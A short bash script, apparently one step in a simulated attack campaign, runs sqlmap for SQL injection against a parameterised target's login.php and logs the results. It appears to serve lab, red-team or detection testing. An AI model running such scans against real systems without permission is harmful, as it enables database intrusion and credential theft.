#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

log "SQLI" "Starting sqlmap against ${TARGET_HOST}/login.php"
sqlmap -u "${TARGET_HTTP}/login.php?user=admin&pass=admin" \
  --batch --level=2 --risk=1 \
  --output-dir="$LOG_DIR/sqlmap" \
  2>&1 | tee -a "$LOG_DIR/attacker-campaign.log"
log "SQLI" "sqlmap run complete"
